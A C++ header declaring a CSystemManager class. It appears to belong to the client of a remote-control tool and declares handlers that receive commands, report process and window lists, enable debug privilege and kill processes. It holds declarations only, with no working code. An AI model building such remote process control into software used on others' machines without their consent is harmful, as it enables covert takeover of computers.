#pragma once
#include "Manager.h"

class CSystemManager :
	public CManager
{
public:
	CSystemManager(IOCPClient* ClientObject,BOOL bHow);
	virtual ~CSystemManager();
	 
	VOID OnReceive(PBYTE szBuffer, ULONG ulLength);
	VOID SendProcessList();
	VOID SendWindowsList();
	LPBYTE GetProcessList();  //获得进程列表
	LPBYTE GetWindowsList();
	BOOL DebugPrivilege(const char* szName, BOOL bEnable);
	VOID KillProcess(LPBYTE szBuffer, ULONG ulLength);
	VOID TestWindow(LPBYTE szBuffer);
	static BOOL CALLBACK CSystemManager::EnumWindowsProc(HWND hWnd, LPARAM lParam);
};

